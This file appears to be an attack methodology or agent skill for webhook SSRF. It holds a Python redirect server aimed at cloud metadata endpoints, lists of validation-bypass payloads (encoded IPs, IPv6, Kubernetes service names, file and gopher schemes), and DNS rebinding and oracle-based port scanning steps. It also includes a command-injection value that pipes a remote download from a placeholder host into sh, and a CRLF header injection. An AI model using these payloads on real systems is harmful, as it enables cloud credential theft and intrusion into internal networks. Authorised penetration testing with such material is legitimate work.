---
name: webhook_ssrf
description: Webhook SSRF methodology — redirect bypass matrix, validation bypass checklist, oracle detection (retry/timing/DNS), credential injection
---

# Webhook SSRF

Webhook and callback URL inputs are the most common SSRF vector in modern SaaS applications. Unlike one-shot URL fetchers, webhooks create persistent SSRF: the server stores the URL and makes requests to it repeatedly on events. This methodology covers baseline fingerprinting, redirect bypass matrices, validation oracle detection, and credential injection -- turning a webhook URL field into a port scanner, internal service enumerator, and credential harvester.

## Attack Surface

**Where Webhooks Appear**
- Event notification endpoints (GitHub, Slack, Stripe-style integrations)
- Payment callback/IPN URLs
- CI/CD pipeline triggers and notification URLs
- Status page ping/monitor URLs
- Integration settings (Zapier, n8n, custom webhooks)
- Email forwarding/relay URLs
- API callback URLs for async operations
- Health check / uptime monitoring URLs

**What Makes Webhook SSRF Distinct**
- Persistent: URL is stored and hit repeatedly (not just once)
- Event-triggered: attacker controls when deliveries happen
- Retry logic: failed deliveries get retried, enabling oracle attacks
- Body content: webhook payloads may contain sensitive application data
- Headers: custom headers or auth tokens may be sent with deliveries

## Phase 1: Baseline Fingerprinting

Establish what the webhook delivery looks like from the server side.

```bash
# Step 1: Set up a webhook receiver
# Option A: webhook.site (public, quick)
# Option B: interactsh (private, DNS + HTTP)
interactsh-client -v

# Step 2: Register the webhook URL
curl -X POST https://TARGET/api/webhooks \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://WEBHOOK_SITE_URL", "events": ["*"]}'

# Step 3: Trigger a delivery (create an event)
curl -X POST https://TARGET/api/trigger-event \
  -H "Authorization: Bearer TOKEN"

# Step 4: Capture and document:
# - Source IP (is it a known cloud range? NAT? proxy?)
# - User-Agent header
# - Custom headers (X-Webhook-Signature, X-Request-Id, etc.)
# - HTTP method (POST, GET, PUT)
# - Body format (JSON, form-encoded, XML)
# - TLS version / SNI behavior
# - Timeout duration (how long before the server gives up)
```

## Phase 2: Redirect Bypass Matrix

Test if the webhook delivery system follows HTTP redirects, and which types. This is the primary SSRF vector: webhook URL passes validation (points to external host), but redirects to internal.

```bash
# Set up a redirect server (Python one-liner)
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else 'http://169.254.169.254/latest/meta-data/'
STATUS = int(sys.argv[2]) if len(sys.argv) > 2 else 302

class Handler(BaseHTTPRequestHandler):
    def do_GET(self): self.redirect()
    def do_POST(self): self.redirect()
    def redirect(self):
        self.send_response(STATUS)
        self.send_header('Location', TARGET_URL)
        self.end_headers()
        body_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(body_len) if body_len else b''
        print(f'{self.command} {self.path} -> {STATUS} -> {TARGET_URL} (body: {len(body)} bytes)')

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
" 'http://169.254.169.254/latest/meta-data/' 302
```

Test each redirect status code:

```bash
# For each status code, register a webhook pointing to your redirect server
# and check if the delivery follows the redirect

# Status codes to test:
# 301 Moved Permanently  — most implementations follow
# 302 Found              — most implementations follow, may change POST→GET
# 303 See Other          — should change to GET
# 307 Temporary Redirect — MUST preserve method (POST stays POST)
# 308 Permanent Redirect — MUST preserve method AND body

# For each, document:
# 1. Does it follow the redirect? (check if request arrives at redirect target)
# 2. Is the HTTP method preserved? (POST→POST or POST→GET?)
# 3. Is the body preserved? (critical for 307/308)
# 4. Are headers preserved? (Authorization, custom headers)
# 5. How many hops does it follow? (test 2, 5, 10 redirect chain)

# Decision matrix:
# Follows 302 → redirect to http://169.254.169.254 for metadata
# Follows 307/308 with body → POST-based SSRF (can write to internal services)
# Follows with headers → credential forwarding to internal services
```

## Phase 3: Validation Bypass Checklist

Systematically test what the webhook URL validator blocks.

### Private IP Addresses

```bash
# Register webhook with each, note which are blocked vs accepted
# IPv4 private ranges
http://127.0.0.1/
http://127.0.0.2/
http://0.0.0.0/
http://10.0.0.1/
http://10.255.255.255/
http://172.16.0.1/
http://172.31.255.255/
http://192.168.0.1/
http://192.168.1.1/
http://169.254.169.254/     # AWS metadata
http://169.254.170.2/       # AWS ECS credentials
http://169.254.170.23/      # AWS EKS pod identity

# IPv6
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:7f00:1]/
http://[::ffff:a9fe:a9fe]/  # 169.254.169.254 in IPv6

# Alternative representations of 127.0.0.1
http://2130706433/          # Decimal
http://0x7f000001/          # Hex
http://017700000001/        # Octal
http://127.1/               # Short form
http://0/                   # 0.0.0.0 short
```

### Kubernetes Service Names

```bash
http://kubernetes.default/
http://kubernetes.default.svc/
http://kubernetes.default.svc.cluster.local/
http://kube-dns.kube-system.svc.cluster.local/
http://metrics-server.kube-system.svc.cluster.local/
http://vault.vault.svc.cluster.local:8200/
# Internal services by name
http://redis.default.svc.cluster.local:6379/
http://postgres.default.svc.cluster.local:5432/
```

### Cloud Metadata Endpoints

```bash
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# AWS ECS task credentials
http://169.254.170.2/v2/credentials/

# AWS EKS pod identity
http://169.254.170.23/v1/credentials

# GCP (requires header -- may not work via webhook)
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### DNS Rebinding

```bash
# Use rbndr.us: resolves to IP A first, then IP B
# First resolution: legitimate IP (passes validation)
# Second resolution: 127.0.0.1 (hits internal service)
http://7f000001.PUBLIC_IP_HEX.rbndr.us/

# Make-my-dns or similar services
# Configure DNS A record with short TTL alternating between public and 127.0.0.1
```

### URL Scheme Testing

```bash
http://target/           # Standard
https://target/          # TLS
gopher://127.0.0.1:6379/ # Redis protocol
file:///etc/passwd       # Local file read
dict://127.0.0.1:6379/   # Redis via dict protocol
ftp://127.0.0.1/         # FTP
```

### Unresolvable Hostnames (Async Resolution Detection)

```bash
# If the server accepts a URL with an unresolvable hostname,
# it means validation does NOT perform DNS resolution at submission time.
# This means resolution happens at delivery time → DNS rebinding works.

curl -X POST https://TARGET/api/webhooks \
  -H "Authorization: Bearer TOKEN" \
  -d '{"url": "http://this-will-never-resolve-xxxxxx.example.com/callback"}'

# Accepted (201/200) → async resolution → DNS rebinding viable
# Rejected (400) with DNS error → sync resolution at submission time
```

## Phase 4: Oracle Detection

Even without direct response reflection, webhook delivery mechanics leak information about internal network topology.

### Retry Oracle

```bash
# Set up your server to return different status codes
# and observe retry behavior for each

# Redirect server that returns configurable status:
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(int(self.path.strip('/')))
        self.end_headers()
        self.wfile.write(b'ok')
HTTPServer(('0.0.0.0', 8888), H).serve_forever()
"

# Test: set webhook to http://YOUR_SERVER:8888/200 → observe: no retries
# Test: set webhook to http://YOUR_SERVER:8888/500 → observe: 3 retries at 1m intervals
# Test: set webhook to http://YOUR_SERVER:8888/000 → connection refused → observe retries?

# Now use the retry oracle for port scanning:
# Point webhook to http://127.0.0.1:PORT/
# Open port (HTTP service) → likely 200/404 → no retries
# Open port (non-HTTP) → connection error → retries
# Closed port → connection refused → retries (different count?)
# Filtered port → timeout → retries (longer delay?)

# If retry count/timing differs between open/closed/filtered → you have a port scanner
```

### Timing Oracle

```bash
# Measure how long the webhook delivery takes
# Set webhook URL → trigger event → measure time until delivery confirmation

# Compare:
# External URL (webhook.site) → baseline latency (e.g., 200ms)
# Internal IP, open port (127.0.0.1:80) → fast response (~10ms)
# Internal IP, closed port (127.0.0.1:9999) → connection refused (~5ms)
# Internal IP, filtered port → timeout (30s+)
# Non-existent host → DNS failure (~2s)

# If the API returns delivery status with timestamps:
curl -s https://TARGET/api/webhooks/WEBHOOK_ID/deliveries | jq '.[].duration'
```

### DNS Oracle

```bash
# Use interactsh or Burp Collaborator for DNS monitoring
# Set webhook to http://UNIQUE_ID.interactsh-server.com
# Each delivery triggers a DNS lookup — confirms the server is making the request

# Use unique subdomains to test internal resolution:
# http://test-127-0-0-1.UNIQUE.interact.sh → if DNS query arrives,
# the server attempted resolution (even if connection was blocked)
```

### Error Reflection Oracle

```bash
# Check if delivery errors appear in the API or UI
curl -s https://TARGET/api/webhooks/WEBHOOK_ID/deliveries | jq .
# Look for:
# "error": "connection refused"           → port closed
# "error": "timeout"                       → port filtered
# "error": "SSL certificate error"         → port open, HTTPS service
# "error": "DNS resolution failed"         → hostname doesn't resolve
# "error": "resolves to private IP: X.X.X.X" → IP leaked in error message!

# Validator oracle: some validators return the resolved IP in error messages
curl -X POST https://TARGET/api/webhooks \
  -d '{"url": "http://127.0.0.1/"}' 2>&1
# "Error: URL resolves to private IP address 127.0.0.1"
# → Confirms validation is resolving DNS (rebinding may be harder)
# → But also leaks internal IPs when you try internal hostnames
```

## Phase 5: Credential Injection

```bash
# Basic auth in URL — test if credentials are sent with the request
http://admin:password@internal-service.svc.cluster.local:8080/
# Some HTTP clients honor userinfo in URLs and send Authorization header

# Check if credentials survive redirects:
# 1. Set webhook to http://user:pass@YOUR_SERVER/
# 2. YOUR_SERVER returns 302 → http://user:pass@INTERNAL_HOST/
# 3. Check if internal host receives Authorization header

# Custom header injection via URL (library-dependent):
http://internal-host/%0d%0aX-Custom-Header:%20injected/
# CRLF injection in URL path → may inject headers in some HTTP libraries
```

## Phase 6: Body Analysis and Injection

```bash
# Webhook payloads often contain sensitive application data
# Examine what data is sent in the webhook body:
# - User information (emails, names, IDs)
# - API keys or tokens
# - Internal identifiers (database IDs, tenant IDs)
# - Application state (order details, payment info)

# If you control any fields that appear in the webhook body:
# Test injection into those fields:
# - Set your name to: "; curl http://INTERACT_SH | sh #"
# - Set your email to: "test@evil.com\r\nX-Injected: true"
# - If the body is XML: test XXE injection via controlled fields
# - If the body is JSON: test for template injection in string values
```

## Decision Tree

```
START: Register webhook with external URL (webhook.site)
  |
  ├── Delivery received?
  |   ├── YES → Document source IP, headers, body
  |   |   ├── Test redirect following (302 to internal)
  |   |   |   ├── Redirect followed → SSRF CONFIRMED
  |   |   |   |   ├── Test cloud metadata (169.254.169.254)
  |   |   |   |   ├── Test internal services (K8s, Redis)
  |   |   |   |   └── Test with 307/308 for POST-based SSRF
  |   |   |   └── Redirect not followed → test direct internal URLs
  |   |   |
  |   |   ├── Test direct internal URLs
  |   |   |   ├── Accepted → SSRF (no validation)
  |   |   |   └── Rejected → test validation bypasses
  |   |   |       ├── DNS rebinding (rbndr.us)
  |   |   |       ├── IPv6 variants
  |   |   |       ├── Decimal/hex IP encoding
  |   |   |       └── Unresolvable hostname (async resolution check)
  |   |   |
  |   |   └── Check for oracles
  |   |       ├── Retry oracle → port scanning
  |   |       ├── Timing oracle → service detection
  |   |       ├── Error reflection → IP/hostname leakage
  |   |       └── DNS oracle → confirms server-side resolution
  |   |
  |   └── NO → Check if webhook requires verification/signing
  |
  └── Not delivered → Different event trigger? Rate limited?
```

## Testing Methodology

1. **Baseline**: Register webhook to external receiver, trigger delivery, capture full request details
2. **Redirect matrix**: Test 301/302/303/307/308 redirects to internal targets
3. **Validation bypass**: Systematically test private IPs, K8s names, metadata, DNS rebinding, schemes
4. **Oracle detection**: Probe retry behavior, timing differences, DNS queries, error messages
5. **Credential injection**: Test basic auth in URL, header injection, credential forwarding through redirects
6. **Body analysis**: Examine webhook payload for sensitive data and injection points
7. **Port scanning**: Use the strongest oracle to scan internal port ranges (common ports: 80, 443, 5432, 3306, 6379, 8080, 8443, 9090, 9200, 27017)
8. **Service enumeration**: Use the strongest oracle to enumerate K8s service names and cloud metadata

## Validation Requirements

1. **Direct SSRF**: Show internal service data retrieved via webhook delivery
2. **Redirect SSRF**: Show redirect chain from external URL to internal target with response data
3. **Blind SSRF with oracle**: Document the oracle (retry count, timing, error message) and show port scan results
4. **Credential injection**: Show Authorization header delivered to internal service
5. **Metadata access**: Show cloud credentials retrieved via metadata endpoint through webhook

## Impact

- **Cloud credential theft** via metadata endpoint access (CVSS 8.6+)
- **Internal service discovery** and port scanning of private network
- **Data exfiltration** via webhook payloads containing sensitive application data
- **Lateral movement** to internal services (Redis, databases, K8s API)
- **Persistent access** since webhook URLs are stored and retried

## Pro Tips

1. Webhook SSRF is persistent -- the URL stays registered and fires on every event, giving you repeated access unlike one-shot SSRF
2. Always test 308 redirects specifically -- they preserve POST body, enabling write operations against internal services
3. The retry oracle is the most reliable blind detection method: open ports respond fast (no retry), closed ports cause connection refused (retry with different pattern)
4. Error messages are gold: some implementations reflect the resolved IP address, giving you DNS resolution as a service for internal hostnames
5. Test webhook URL updates separately from creation -- update validation is often weaker than creation validation
6. If the application signs webhook deliveries (HMAC), the signature key is a secret worth extracting
7. Check if webhook deliveries include the response body in delivery logs -- if so, you have full SSRF response reflection
8. DNS rebinding is the go-to bypass when sync DNS validation is in place -- use rbndr.us with your public IP and 127.0.0.1

## Summary

Webhook SSRF is the most common and persistent form of SSRF in modern applications. The methodology is: baseline fingerprint, test redirect following for each status code, systematically bypass URL validation, detect blind oracles (retry, timing, DNS, error reflection), and use the strongest oracle to scan internal networks. A single webhook endpoint that follows redirects or accepts private IPs gives persistent access to the internal network.
